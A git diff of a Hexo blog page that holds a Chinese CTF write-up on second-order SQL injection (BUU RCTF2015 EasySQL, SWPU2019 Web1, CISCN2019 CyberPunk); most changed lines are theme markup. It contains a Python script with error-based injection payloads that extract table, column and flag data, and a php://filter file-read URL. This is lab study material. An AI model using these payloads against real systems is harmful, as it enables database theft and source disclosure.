@@ -18,6 +18,9 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
+    
+    
+        
         <meta name="description" content="Buu - [RCTF2015]EasySQL [ 二次注入 ]拿信息：最近一次做这个题，靠自己看出来的，是一个二次注入题（注册 -&gt; 数据库），在改密码页面（从数据库中取出）存在注入（无回显） 刚开始注入时，发现过滤空格 &#x3D;&gt; 可以通过fuzz来测过滤了什么   Response长度为521的都是被过滤的  分析：可以通过Hackbar来执行，这样方便一点（因为要多次注册号">
 <meta property="og:type" content="article">
 <meta property="og:title" content="二次注入">
@@ -57,9 +60,8 @@
     
     <title>
         
-            二次注入 -
+            二次注入 | Personal Blog
         
-        Personal Blog
     </title>
 
     
@@ -75,7 +77,7 @@
 
     
         
-<link rel="stylesheet" href="/assets/build/styles.css">
+<link rel="stylesheet" href="/css/build/tailwind.css">
 
     
 
@@ -90,16 +92,16 @@
     
     
     
-
+    
     
         
-<script src="/js/libs/anime.min.js"></script>
+<script src="/js/build/libs/anime.min.js"></script>
 
     
 
     <script id="hexo-configurations">
     window.config = {"hostname":"li1x.github.io","root":"/","language":"en","path":"search.xml"};
-    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":4,"number":true,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Personal Blog","subtitle":{"text":["Loading"],"hitokoto":{"enable":true,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.6.4","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/home","icon":"fa-regular fa-house"},"tags":{"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"}},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder icon-space"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"Doit","show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":4,"number":true,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Personal Blog","subtitle":{"text":["Loading"],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com","instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.2","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/home","icon":"fa-regular fa-house"},"tags":{"Tags":{"icon":"fa-solid fa-tags","path":"/tags/"}},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder icon-space"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"Doit","show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2022/8/17 11:45:14"};
     window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
     window.data = {"masonry":false};
   </script>
@@ -124,23 +126,22 @@
 <meta name="generator" content="Hexo 6.3.0"></head>
 
 
-<body>
-<div class="progress-bar-container">
-    
-        <span class="scroll-progress-bar"></span>
-    
 
-    
-        <span class="pjax-progress-bar"></span>
-<!--        <span class="swup-progress-icon">-->
-<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
-<!--        </span>-->
-    
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
 </div>
 
-
-
-    <style>
+<style>
     :root {
         --preloader-background-color: #fff;
         --preloader-text-color: #000;
@@ -228,28 +229,30 @@
             textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
         });
 
-        var animation = anime.timeline({loop: true})
+        var animation = anime.timeline({ loop: true })
             .add({
                 targets: '.ml13 .letter',
-                translateY: [40,0],
+                translateY: [20, 0],
                 translateZ: 0,
-                opacity: [0,1],
-                filter: ['blur(5px)', 'blur(0px)'], // Starting from blurred to unblurred
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
                 easing: "easeOutExpo",
-                duration: 1400,
-                delay: (el, i) => 300 + 30 * i,
-            }).add({
-                targets: '.ml13 .letter',
-                translateY: [0,-40],
-                opacity: [1,0],
-                filter: ['blur(0px)', 'blur(5px)'], // Ending from unblurred to blurred
-                easing: "easeInExpo",
                 duration: 1200,
-                delay: (el, i) => 100 + 30 * i,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
                 complete: function() {
-                    hidePreloader(); // Call hidePreloader after the animation completes
+                    hidePreloader();
                 }
-            });
+            }, '-=700');
+
 
         let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
 
@@ -287,15 +290,12 @@
 
 <main class="page-container" id="swup">
 
-    
+	
 
-    <div class="main-content-container">
-
-
-        <div class="main-content-header">
-            <header class="navbar-container px-6 md:px-12">
-
-    <div class="navbar-content ">
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
         <div class="left">
             
             <a class="logo-title" href="/">
@@ -399,7 +399,7 @@
     </div>
 
     <!-- Mobile sheet -->
-    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
         <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
             
                 
@@ -520,40 +520,37 @@
 </header>
 
 
-        </div>
+		</div>
 
-        <div class="main-content-body">
+		<div class="main-content-body transition-fade-up">
+			
 
-            
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
 
-            <div class="main-content">
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">二次注入</h1>
+			</div>
+			
+		</div>
 
-                
-                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
-    <div class="article-content-container">
-
-        <div class="article-title relative w-full">
-            
-                <div class="w-full flex items-center pt-6 justify-start">
-                    <h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">二次注入</h1>
-                </div>
-            
-            </div>
-
-        
-            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
-                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
-                    <img src="/images/redefine-avatar.svg">
-                </div>
-                <div class="info flex flex-col justify-between">
-                    <div class="author flex items-center">
-                        <span class="name text-default-text-color text-lg font-semibold">The Redefine Team</span>
-                        
-                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
-                        
-                    </div>
-                    <div class="meta-info">
-                        <div class="article-meta-info">
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/redefine-avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">The Redefine Team</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
     <span class="article-date article-meta-item">
         <i class="fa-regular fa-pen-fancy"></i>&nbsp;
         <span class="desktop">2024-04-15 17:39:51</span>
@@ -613,16 +610,16 @@
     
 </div>
 
-                    </div>
-                </div>
-            </div>
-        
+				</div>
+			</div>
+		</div>
+		
 
-        
+		
 
 
-        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            <h2 id="Buu-RCTF2015-EasySQL-二次注入"><a href="#Buu-RCTF2015-EasySQL-二次注入" class="headerlink" title="Buu - [RCTF2015]EasySQL [ 二次注入 ]"></a>Buu - [RCTF2015]EasySQL [ 二次注入 ]</h2><h4 id="拿信息："><a href="#拿信息：" class="headerlink" title="拿信息："></a>拿信息：</h4><p>最近一次做这个题，靠自己看出来的，是一个二次注入题<strong>（注册 -&gt; 数据库）</strong>，在改密码页面<strong>（从数据库中取出）</strong>存在注入（无回显）</p>
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="Buu-RCTF2015-EasySQL-二次注入"><a href="#Buu-RCTF2015-EasySQL-二次注入" class="headerlink" title="Buu - [RCTF2015]EasySQL [ 二次注入 ]"></a>Buu - [RCTF2015]EasySQL [ 二次注入 ]</h2><h4 id="拿信息："><a href="#拿信息：" class="headerlink" title="拿信息："></a>拿信息：</h4><p>最近一次做这个题，靠自己看出来的，是一个二次注入题<strong>（注册 -&gt; 数据库）</strong>，在改密码页面<strong>（从数据库中取出）</strong>存在注入（无回显）</p>
 <p>刚开始注入时，发现过滤空格 &#x3D;&gt; 可以通过fuzz来测过滤了什么</p>
 <p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/4-15-01.png"></p>
 <blockquote>
@@ -645,8 +642,8 @@
 <p>-&gt; reverse 逆向输出，因为对长度有限制，正向输出flag不全</p>
 <p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/4-15-02.png"></p>
 <hr>
-<p><strong><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/Yb_140/article/details/127807220">脚本出处： <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></strong></p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://8acdca94-eab8-4f8e-b70e-2aa84977a32b.node5.buuoj.cn:81/&#x27;</span></span><br><span class="line">url1=url+<span class="string">&#x27;register.php&#x27;</span></span><br><span class="line">url2=url+<span class="string">&#x27;login.php&#x27;</span></span><br><span class="line">url3=url+<span class="string">&#x27;changepwd.php&#x27;</span></span><br><span class="line"></span><br><span class="line">res=requests.session()</span><br><span class="line"><span class="comment">#例如，如果你在访问一个网站时需要先登录，然后再访问其他需要登录才能查看的页面，你可以使用会话对象来保持登录状态，从而在后续的请求中无需再次登录。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">username</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span> : username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span> : <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span> : <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    res.post(url=url1, data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span> : username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span> : <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    res.post(url=url2, data=data) </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;oldpass&#x27;</span> : <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;newpass&#x27;</span> : <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    flagg = res.post(url=url3, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;XPATH&#x27;</span> <span class="keyword">in</span> flagg.text:</span><br><span class="line">        <span class="built_in">print</span>(flagg.text)    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">go</span>(<span class="params">username</span>):</span><br><span class="line">    register(username)</span><br><span class="line">    login(username)</span><br><span class="line">    change()</span><br><span class="line"></span><br><span class="line">go(<span class="string">&#x27;1&quot;||(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))))#1&#x27;</span>)</span><br><span class="line">go(<span class="string">&#x27;1&quot;||(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&quot;users&quot;)))))#1&#x27;</span>)</span><br><span class="line">go(<span class="string">&#x27;1&quot;||extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&quot;^f&quot;))))#1&#x27;</span>)</span><br><span class="line">go(<span class="string">&#x27;1&quot;||extractvalue(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&quot;^f&quot;)))))#1&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+<p><strong><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/Yb_140/article/details/127807220">脚本出处：<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></strong></p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://8acdca94-eab8-4f8e-b70e-2aa84977a32b.node5.buuoj.cn:81/&#x27;</span></span><br><span class="line">url1=url+<span class="string">&#x27;register.php&#x27;</span></span><br><span class="line">url2=url+<span class="string">&#x27;login.php&#x27;</span></span><br><span class="line">url3=url+<span class="string">&#x27;changepwd.php&#x27;</span></span><br><span class="line"></span><br><span class="line">res=requests.session()</span><br><span class="line"><span class="comment">#例如，如果你在访问一个网站时需要先登录，然后再访问其他需要登录才能查看的页面，你可以使用会话对象来保持登录状态，从而在后续的请求中无需再次登录。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">username</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span> : username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span> : <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span> : <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    res.post(url=url1, data=data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">username</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span> : username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span> : <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    res.post(url=url2, data=data) </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;oldpass&#x27;</span> : <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;newpass&#x27;</span> : <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    flagg = res.post(url=url3, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;XPATH&#x27;</span> <span class="keyword">in</span> flagg.text:</span><br><span class="line">        <span class="built_in">print</span>(flagg.text)    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">go</span>(<span class="params">username</span>):</span><br><span class="line">    register(username)</span><br><span class="line">    login(username)</span><br><span class="line">    change()</span><br><span class="line"></span><br><span class="line">go(<span class="string">&#x27;1&quot;||(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))))#1&#x27;</span>)</span><br><span class="line">go(<span class="string">&#x27;1&quot;||(extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&quot;users&quot;)))))#1&#x27;</span>)</span><br><span class="line">go(<span class="string">&#x27;1&quot;||extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&quot;^f&quot;))))#1&#x27;</span>)</span><br><span class="line">go(<span class="string">&#x27;1&quot;||extractvalue(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&quot;^f&quot;)))))#1&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
 
 <blockquote>
 <p>首先得明白需要请求多个页面 -&gt; 如何让它知道你是同一个用户</p>
@@ -660,15 +657,15 @@
 <li>and被过滤时 &#x3D;&gt; ||</li>
 <li>多有多个页面时 如何编写python来自动化获取flag</li>
 </ol>
-<h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/105179021">Wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/105179021">Wp<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 <hr>
-<h2 id="SWPU2019-Web1-二次注入题"><a href="#SWPU2019-Web1-二次注入题" class="headerlink" title="[SWPU2019]Web1 二次注入题"></a>[SWPU2019]Web1 二次注入题</h2><p><strong>参考</strong>:<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/satasun/article/details/109391116">https://blog.csdn.net/satasun/article/details/109391116 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="SWPU2019-Web1-二次注入题"><a href="#SWPU2019-Web1-二次注入题" class="headerlink" title="[SWPU2019]Web1 二次注入题"></a>[SWPU2019]Web1 二次注入题</h2><p><strong>参考</strong>:<a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/satasun/article/details/109391116">https://blog.csdn.net/satasun/article/details/109391116<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
 <hr>
 <p>知识点:</p>
 <ul>
-<li><input disabled type="checkbox"> <a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/105899269">二次注入 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li><input disabled type="checkbox"> <a class="link" target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98206699">无列名注入 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
-<li><input disabled type="checkbox"> <a class="link" target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193512">information_schema的过滤 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><input disabled type="checkbox"> <a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/105899269">二次注入<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><input disabled type="checkbox"> <a class="link" target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98206699">无列名注入<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><input disabled type="checkbox"> <a class="link" target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193512">information_schema的过滤<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
 </ul>
 <hr>
 <h4 id="1-二次注入"><a href="#1-二次注入" class="headerlink" title="1.二次注入"></a>1.二次注入</h4><p><strong>原理</strong></p>
@@ -724,13 +721,13 @@
 <h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk-php伪协议-二次注入"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk-php伪协议-二次注入" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk [ php伪协议 二次注入 ]"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk [ php伪协议 二次注入 ]</h2><p>打开环境，看源码最后有一个提示： <!--?file=?--></p>
 <p>-&gt; php伪协议读取文件</p>
 <p><code>url/index.php?file=php://filter/read/convert.base64-encode/resource=index.php</code></p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#index.php的源码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="comment">// $file = $_GET[&quot;file&quot;];</span></span><br><span class="line"><span class="variable">$file</span> = (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="literal">null</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,<span class="variable">$file</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;no way!&#x27;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">include</span>(<span class="variable">$file</span>);<span class="comment">#伪协议点</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
